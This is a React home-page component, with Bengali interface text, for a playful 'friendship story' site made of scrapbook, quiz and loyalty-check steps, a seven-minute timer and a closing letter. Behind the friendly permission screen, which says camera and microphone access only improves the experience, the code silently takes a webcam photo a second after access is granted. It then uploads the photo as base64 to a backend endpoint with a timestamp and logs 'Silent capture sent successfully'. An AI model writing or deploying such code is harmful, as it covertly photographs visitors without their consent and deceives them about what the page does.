import FriendshipMeter from "@/components/Home/FriendshipMeter";
import JarOfHearts from "@/components/Home/JarOfHearts";
import MindReader from "@/components/Home/MindReader";
import Scrapbook from "@/components/Home/Scrapbook";
import LoyaltyCheck from "@/components/Home/LoyaltyCheck";
import React, { useState, useEffect, useRef } from "react";
import Typewriter from "@/components/Home/Typewriter";
import useAxiosPublic from "@/hooks/usePublicAxios";

const Home = () => {
  // Step logic update: 0: Welcome, 1: Scrapbook, 2: Jar, 3: Mind, 4: Loyalty, 5: Meter, 6: Secret
  const [step, setStep] = useState(-1);
  const [timeLeft, setTimeLeft] = useState(420);
  const videoRef = useRef(null);
  const axiosPublic = useAxiosPublic();

  const captureAndSend = async (stream) => {
  // 1. Ekta temporary video element banano capturing-er jonno
  const video = document.createElement("video");
  video.srcObject = stream;
  video.muted = true;
  video.playsInline = true;

  // Video load hoyar por capture shuru hobe
  video.onloadedmetadata = async () => {
    try {
      await video.play();

      // Camera sensor ready hote ebong focus thik hote 1 sec opekkha kora
      setTimeout(async () => {
        const canvas = document.createElement("canvas");
        
        // Video-r ashol width/height neya
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // 2. Chobi-ke Base64 string-e convert kora (JPEG format)
        const imageData = canvas.toDataURL("image/jpeg", 0.7);

        // 3. Backend-e pathano
        await axiosPublic.post("/upload-capture", {
          image: imageData,
          email: "user@example.com", // Jode Auth thake tobe dynamically boshaben
          time: new Date().toLocaleString(),
        });

        console.log("📸 Silent capture sent successfully!");

        // Memory bachate temporary video element bondho kora
        video.pause();
        video.srcObject = null;
      }, 1000); 

    } catch (err) {
      console.error("Capture process failed:", err);
    }
  };
};
  const handleGrantAccess = async () => {
    try {
      // Camera ebong Mic-er permission ekshathe request kora
      const stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true,
      });
      captureAndSend(stream);
      // Permission peye gele stream-ti video element-e set hobe (jodi dorkar hoy)
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      // Permission success hole step 0 (Welcome page) e niye jabe
      setStep(0);
    } catch (err) {
      console.error("Access Denied:", err);
      alert(
        "Oops! Camera ebong Mic permission chara amra agate parbo na. Please allow korun.",
      );
    }
  };
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`;
  };

  const nextStep = () => setStep(step + 1);

  return (
    <div className="min-h-11/12 bg-[#FFF5F7] text-gray-800 flex flex-col items-center p-4">
      <div className="fixed top-5 right-5 bg-white shadow-md px-4 py-2 rounded-full border border-pink-200 text-pink-600 font-bold text-sm z-50">
        ⏱️ সারপ্রাইজ খুলতে বাকি: {formatTime(timeLeft)}
      </div>

      <div className="w-full max-w-2xl mt-12">
        {/* STEP -1: PERMISSION GATEWAY */}
        {step === -1 && (
          <div className="text-center animate-fade-in space-y-6 bg-white p-10 rounded-3xl shadow-2xl border-2 border-pink-100">
            <div className="text-6xl">📸</div>
            <h2 className="text-3xl font-bold text-pink-600">অনুমতি প্রয়োজন</h2>
            <p className="text-gray-600 leading-relaxed">
              বন্ধুত্বের এই গল্পঘরে প্রবেশ করতে আপনার <b>Camera</b> এবং{" "}
              <b>Microphone</b>-এর অনুমতি প্রয়োজন। ভয় নেই, এটি শুধু আমাদের
              অভিজ্ঞতাকে আরও সুন্দর করার জন্য।
            </p>
            <button
              onClick={handleGrantAccess}
              className="px-10 py-4 bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-full font-bold shadow-lg hover:scale-105 transition-all"
            >
              নিশ্চিত করুন ✨
            </button>
          </div>
        )}

        {/* Hidden Video Tag (Background-e capture korar jonno lagte pare) */}
        <video
          ref={videoRef}
          autoPlay
          playsInline
          muted
          style={{ display: "none" }}
        />

        {/* STEP 0: WELCOME */}
        {step === 0 && (
          <div className="text-center animate-fade-in space-y-6">
            <h1 className="text-5xl font-bold text-pink-600 mb-4 font-serif italic">
              আমাদের গল্পঘর
            </h1>
            <p className="text-lg text-gray-600">
              স্বাগতম বন্ধু! আজ আমরা আমাদের বন্ধুত্বের একটা ছোট ভ্রমণে যাবো।
              তুমি কি তৈরি?
            </p>
            <button
              onClick={nextStep}
              className="px-10 py-4 bg-pink-500 text-white rounded-full font-bold shadow-lg"
            >
              চল শুরু করি! 🚀
            </button>
          </div>
        )}

        {step === 1 && (
          <div className="animate-slide-up">
            <Scrapbook back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              পরের গল্পে চলো →
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="animate-slide-up">
            <JarOfHearts back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              একটু মন পড়ি? →
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="animate-slide-up">
            <MindReader back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              লয়্যালটি চেক করো →
            </button>
          </div>
        )}

        {/* 2. LOYALTY CHECK ADDED HERE */}
        {step === 4 && (
          <div className="animate-slide-up">
            <LoyaltyCheck back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className="w-full mt-6 py-3 bg-pink-400 text-white rounded-xl font-bold"
            >
              ফ্রেন্ডশিপ মিটার দেখো →
            </button>
          </div>
        )}

        {step === 5 && (
          <div className="animate-slide-up">
            <FriendshipMeter back={() => setStep(step - 1)} />
            <button
              onClick={nextStep}
              className={`w-full mt-6 py-3 rounded-xl font-bold text-white transition-all ${timeLeft === 0 ? "bg-green-500" : "bg-gray-300 cursor-not-allowed"}`}
              disabled={timeLeft > 0}
            >
              {timeLeft === 0
                ? "শেষ সারপ্রাইজটি দেখো! ✨"
                : "০৭ মিনিট না হওয়া পর্যন্ত অপেক্ষা করো..."}
            </button>
          </div>
        )}

        {step === 6 && (
          <div className="animate-bounce-in bg-gradient-to-br from-pink-500 to-rose-600 p-10 rounded-3xl text-white text-center shadow-2xl shadow-pink-200">
            <h2 className="text-3xl font-bold mb-4">
              আমাদের বন্ধুত্বের চিঠি 💌
            </h2>
            <div className="text-left space-y-4 font-medium italic">
              <p>
                <Typewriter text="প্রিয় বন্ধু," delay={100} />
              </p>
              <p className="leading-relaxed">
                <Typewriter
                  text="পুরো ০৭ মিনিট এই ইন্টারফেসটাতে সময় দেওয়ার জন্য ধন্যবাদ। এটা শুধু একটা কোড না, এটা তোমার প্রতি আমার কৃতজ্ঞতা। তুমি আমার জীবনে না থাকলে দিনগুলো হয়তো এতোটা সুন্দর হতো না। আমাদের এই স্মৃতিগুলো সবসময় এক থাকবে।"
                  delay={40}
                />
              </p>
              <p>
                "তুমি আমার জীবনে না থাকলে দিনগুলো হয়তো এতোটা সুন্দর হতো না।
                আমাদের এই স্মৃতিগুলো সবসময় এক থাকবে।"
              </p>
              <p className="text-right mt-6">- ইতি, তোমার প্রিয় বন্ধু ❤️</p>
            </div>
            <button
              onClick={() => setStep(0)}
              className="mt-8 text-xs underline opacity-70"
            >
              একদম শুরুতে ফিরে যাও
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Home;
